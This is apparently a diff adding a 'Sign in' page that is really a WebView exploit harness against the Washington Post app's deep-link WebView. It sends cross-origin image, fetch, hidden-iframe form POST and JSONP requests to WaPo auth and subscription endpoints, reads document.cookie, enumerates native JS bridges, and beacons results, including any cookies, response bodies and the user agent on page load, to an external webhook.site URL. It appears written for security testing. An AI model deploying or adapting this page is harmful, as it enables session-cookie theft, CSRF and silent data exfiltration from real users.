@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; color: #333; font-size: 13px; }
+.container { max-width: 400px; margin: 20px auto; padding: 0 16px; }
+.card { background: white; border-radius: 8px; padding: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 12px; }
+h3 { font-size: 15px; margin-bottom: 8px; }
+.log { font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; background: #f0f0f0; padding: 8px; border-radius: 4px; max-height: 200px; overflow-y: auto; margin-top: 6px; }
+.status { padding: 4px 8px; border-radius: 3px; margin: 2px 0; }
+.pass { background: #d4edda; color: #155724; }
+.fail { background: #f8d7da; color: #721c24; }
+.info { background: #d1ecf1; color: #0c5460; }
+.pending { background: #fff3cd; color: #856404; }
+button { padding: 10px 16px; background: #333; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; margin: 4px 2px; }
+button:disabled { background: #999; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="card">
+<h3>WebView Cookie Leak Tests</h3>
+<p>Testing if WaPo auth cookies are sent with requests initiated from attacker-controlled content in the deep link WebView.</p>
+</div>
+
+<!-- Test 1: Image tag cross-origin request -->
+<div class="card">
+<h3>Test 1: Image tag to WaPo endpoint</h3>
+<p>Loads an image from washingtonpost.com — check Caido for cookies on the request.</p>
+<button id="btn1" onclick="runTest1()">Run Test 1</button>
+<div class="log" id="log1">Ready</div>
+</div>
+
+<!-- Test 2: Fetch API cross-origin -->
+<div class="card">
+<h3>Test 2: Fetch to WaPo API (no-cors)</h3>
+<p>fetch() in no-cors mode — request fires, can't read response, but cookies may be attached.</p>
+<button id="btn2" onclick="runTest2()">Run Test 2</button>
+<div class="log" id="log2">Ready</div>
+</div>
+
+<!-- Test 3: Fetch with credentials -->
+<div class="card">
+<h3>Test 3: Fetch with credentials:include</h3>
+<p>Explicitly requests cookies be sent cross-origin.</p>
+<button id="btn3" onclick="runTest3()">Run Test 3</button>
+<div class="log" id="log3">Ready</div>
+</div>
+
+<!-- Test 4: Form POST to WaPo -->
+<div class="card">
+<h3>Test 4: Hidden form POST to WaPo</h3>
+<p>Submits a form to a WaPo endpoint via hidden iframe — cookies may ride along.</p>
+<button id="btn4" onclick="runTest4()">Run Test 4</button>
+<div class="log" id="log4">Ready</div>
+</div>
+
+<!-- Test 5: Script tag (JSONP-style) -->
+<div class="card">
+<h3>Test 5: Script tag to WaPo endpoints</h3>
+<p>Tests if any WaPo endpoint returns JSONP or JS-parseable data with auth cookies.</p>
+<button id="btn5" onclick="runTest5()">Run Test 5</button>
+<div class="log" id="log5">Ready</div>
+</div>
+
+<!-- Test 6: Full navigation (shouldOverrideUrlLoading test) -->
+<div class="card">
+<h3>Test 6: Navigate to WaPo URLs</h3>
+<p>Tests which WaPo URLs get caught by z15.Q0() vs load in-WebView with cookies. Each button navigates away — run one at a time.</p>
+<button onclick="navTest('https://subscribe.washingtonpost.com/subscriptionapi/v2/session')">Session API</button>
+<button onclick="navTest('https://www.washingtonpost.com/subscribe/signin')">Signin</button>
+<button onclick="navTest('https://subscribe.washingtonpost.com/subscriptionapi/v2/subscriptions/88826988/associates/status')">Sub API</button>
+<button onclick="navTest('https://www.washingtonpost.com/my-post/preferences/')">My Post</button>
+<div class="log" id="log6">Pick a URL to navigate to. The WebView will leave this page. Check Caido for what happened.</div>
+</div>
+
+<!-- Test 7: Read document.cookie -->
+<div class="card">
+<h3>Test 7: Read document.cookie</h3>
+<p>Check what cookies JS can see from this origin.</p>
+<button id="btn7" onclick="runTest7()">Run Test 7</button>
+<div class="log" id="log7">Ready</div>
+</div>
+
+<!-- Test 8: Check WebView JS bridge objects -->
+<div class="card">
+<h3>Test 8: Enumerate JS bridges</h3>
+<p>Check if any native JS interfaces are exposed to this page.</p>
+<button id="btn8" onclick="runTest8()">Run Test 8</button>
+<div class="log" id="log8">Ready</div>
+</div>
+
+<!-- Exfil beacon -->
+<div class="card">
+<h3>Results beacon</h3>
+<p>All test results are also sent to webhook.site for remote viewing.</p>
+<div class="log" id="logBeacon">Waiting for tests...</div>
+</div>
+
+</div>
+
+<script>
+var WEBHOOK = "https://webhook.site/479602c4-9e68-4eff-a181-e364537ec39c";
+
+function log(id, msg, cls) {
+  var el = document.getElementById(id);
+  var div = document.createElement('div');
+  div.className = 'status ' + (cls || 'info');
+  div.textContent = msg;
+  if (el.textContent === 'Ready') el.textContent = '';
+  el.appendChild(div);
+}
+
+function beacon(testName, data) {
+  var el = document.getElementById('logBeacon');
+  el.textContent = 'Sent: ' + testName;
+  try {
+    var img = new Image();
+    img.src = WEBHOOK + "?test=" + encodeURIComponent(testName) + "&data=" + encodeURIComponent(JSON.stringify(data));
+  } catch(e) {}
+}
+
+// Test 1: Image tag
+function runTest1() {
+  log('log1', 'Firing image requests...', 'pending');
+  var endpoints = [
+    'https://www.washingtonpost.com/favicon.ico',
+    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
+    'https://id.washingtonpost.com/auth/check'
+  ];
+  endpoints.forEach(function(url, i) {
+    var img = new Image();
+    img.onload = function() { log('log1', '[' + i + '] LOADED: ' + url, 'pass'); };
+    img.onerror = function() { log('log1', '[' + i + '] ERROR (request still fired): ' + url, 'info'); };
+    img.src = url + '?_t=' + Date.now();
+  });
+  beacon('test1_image', {endpoints: endpoints});
+  log('log1', 'Check Caido for Cookie headers on these requests', 'pending');
+}
+
+// Test 2: Fetch no-cors
+function runTest2() {
+  log('log2', 'Firing fetch requests (no-cors)...', 'pending');
+  var endpoints = [
+    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
+    'https://www.washingtonpost.com/prism/api/prism-query',
+    'https://id.washingtonpost.com/auth/check'
+  ];
+  endpoints.forEach(function(url, i) {
+    fetch(url, { mode: 'no-cors', credentials: 'include' })
+      .then(function(r) {
+        log('log2', '[' + i + '] Response type: ' + r.type + ' status: ' + r.status + ' — ' + url, 'pass');
+      })
+      .catch(function(e) {
+        log('log2', '[' + i + '] Error: ' + e.message + ' — ' + url, 'fail');
+      });
+  });
+  beacon('test2_fetch_nocors', {endpoints: endpoints});
+  log('log2', 'Check Caido for Cookie headers', 'pending');
+}
+
+// Test 3: Fetch with credentials
+function runTest3() {
+  log('log3', 'Firing fetch with credentials:include (cors mode)...', 'pending');
+  var endpoints = [
+    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
+    'https://www.washingtonpost.com/subscribe/signin'
+  ];
+  endpoints.forEach(function(url, i) {
+    fetch(url, { mode: 'cors', credentials: 'include' })
+      .then(function(r) {
+        log('log3', '[' + i + '] Status: ' + r.status + ' type: ' + r.type, 'pass');
+        return r.text().then(function(t) {
+          log('log3', '[' + i + '] Body (first 200): ' + t.substring(0, 200), 'pass');
+          beacon('test3_cors_response_' + i, {url: url, status: r.status, body: t.substring(0, 500)});
+        });
+      })
+      .catch(function(e) {
+        log('log3', '[' + i + '] CORS blocked (expected): ' + e.message, 'info');
+      });
+  });
+  beacon('test3_fetch_cors', {endpoints: endpoints});
+}
+
+// Test 4: Hidden form POST via iframe
+function runTest4() {
+  log('log4', 'Creating hidden iframe + form...', 'pending');
+  var iframe = document.createElement('iframe');
+  iframe.name = 'csrf_frame';
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'https://subscribe.washingtonpost.com/subscriptionapi/v2/subscriptions/88826988/associates/status';
+  form.target = 'csrf_frame';
+
+  document.body.appendChild(form);
+  try {
+    form.submit();
+    log('log4', 'Form submitted to iframe. Check Caido for cookies on the POST.', 'pass');
+  } catch(e) {
+    log('log4', 'Form submit error: ' + e.message, 'fail');
+  }
+  beacon('test4_form_post', {action: form.action});
+}
+
+// Test 5: Script tag JSONP
+function runTest5() {
+  log('log5', 'Loading script tags from WaPo endpoints...', 'pending');
+  var endpoints = [
+    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
+    'https://www.washingtonpost.com/wp-stat/analytics/main.js',
+    'https://www.washingtonpost.com/prism/api/prism-query?query=%7B%22feature%22%3A%22ai-chatbot%22%7D'
+  ];
+  window.__jsonp_callback = function(data) {
+    log('log5', 'JSONP DATA RECEIVED: ' + JSON.stringify(data).substring(0, 300), 'pass');
+    beacon('test5_jsonp_data', data);
+  };
+  endpoints.forEach(function(url, i) {
+    var s = document.createElement('script');
+    s.src = url + (url.indexOf('?') > -1 ? '&' : '?') + 'callback=__jsonp_callback&_t=' + Date.now();
+    s.onload = function() { log('log5', '[' + i + '] Script loaded (check if parseable): ' + url, 'pass'); };
+    s.onerror = function() { log('log5', '[' + i + '] Script load error (check Caido for cookies): ' + url, 'info'); };
+    document.head.appendChild(s);
+  });
+  beacon('test5_jsonp', {endpoints: endpoints});
+}
+
+// Test 6: Full navigation
+function navTest(url) {
+  log('log6', 'Navigating to: ' + url, 'pending');
+  beacon('test6_nav', {url: url});
+  setTimeout(function() { window.location.href = url; }, 300);
+}
+
+// Test 7: Read cookies
+function runTest7() {
+  var cookies = document.cookie;
+  if (cookies && cookies.length > 0) {
+    log('log7', 'COOKIES FOUND:\n' + cookies, 'pass');
+    beacon('test7_cookies', {cookies: cookies});
+  } else {
+    log('log7', 'No cookies visible from this origin (' + window.location.origin + ')', 'info');
+    beacon('test7_cookies', {cookies: 'none', origin: window.location.origin});
+  }
+  log('log7', 'Origin: ' + window.location.origin, 'info');
+  log('log7', 'Protocol: ' + window.location.protocol, 'info');
+  log('log7', 'Hostname: ' + window.location.hostname, 'info');
+}
+
+// Test 8: Enumerate JS bridges
+function runTest8() {
+  var bridges = [
+    'SubsJSInterface', 'SubsJSCallbacks', 'Android', 'WapoAndroid',
+    'NativeApp', 'LinkHandler', 'HeightReporter', 'EmbedJSInterface',
+    'googleAdsJsInterface', 'gmaSdk', 'amzn_bridge', 'webkit',
+    'NativeInterface', 'AppInterface', 'JSBridge', 'nativeBridge'
+  ];
+  var found = [];
+  bridges.forEach(function(name) {
+    try {
+      if (typeof window[name] !== 'undefined' && window[name] !== null) {
+        found.push(name + ' = ' + typeof window[name]);
+        log('log8', 'FOUND: window.' + name + ' = ' + typeof window[name], 'pass');
+        try {
+          var methods = Object.getOwnPropertyNames(window[name]);
+          log('log8', '  Methods: ' + methods.join(', '), 'pass');
+        } catch(e) {}
+      }
+    } catch(e) {
+      log('log8', name + ': access error — ' + e.message, 'info');
+    }
+  });
+  if (found.length === 0) {
+    log('log8', 'No known JS bridges found on window', 'info');
+  }
+  beacon('test8_bridges', {found: found, checked: bridges});
+
+  // Also dump all non-standard window properties
+  var standard = ['location','document','navigator','screen','history','localStorage','sessionStorage','crypto','performance','indexedDB','caches','cookieStore','fetch','alert','confirm','prompt','open','close','stop','focus','blur','print','scroll','scrollTo','scrollBy','getComputedStyle','matchMedia','requestAnimationFrame','cancelAnimationFrame','setTimeout','clearTimeout','setInterval','clearInterval','addEventListener','removeEventListener','dispatchEvent','postMessage','atob','btoa','queueMicrotask','structuredClone','reportError','getSelection','find','self','window','top','parent','frames','frameElement','opener','closed','name','status','length','innerHeight','innerWidth','outerHeight','outerWidth','screenX','screenY','pageXOffset','pageYOffset','scrollX','scrollY','visualViewport','screenLeft','screenTop','origin','isSecureContext','crossOriginIsolated','devicePixelRatio','clientInformation','styleMedia','onbeforeunload','onerror','onload','onunload'];
+  var nonStandard = [];
+  for (var key in window) {
+    if (standard.indexOf(key) === -1 && key.indexOf('on') !== 0 && key.indexOf('webkit') !== 0) {
+      try {
+        var val = typeof window[key];
+        if (val === 'object' || val === 'function') {
+          nonStandard.push(key + ':' + val);
+        }
+      } catch(e) {}
+    }
+  }
+  if (nonStandard.length > 0) {
+    log('log8', '\nNon-standard window objects/functions:\n' + nonStandard.join('\n'), 'info');
+    beacon('test8_nonstandard', {props: nonStandard.slice(0, 50)});
+  }
+}
+
+// Auto-beacon that page loaded
+beacon('page_loaded', {
+  url: window.location.href,
+  origin: window.location.origin,
+  userAgent: navigator.userAgent,
+  timestamp: new Date().toISOString()
+});
+</script>
+</body>
+</html>
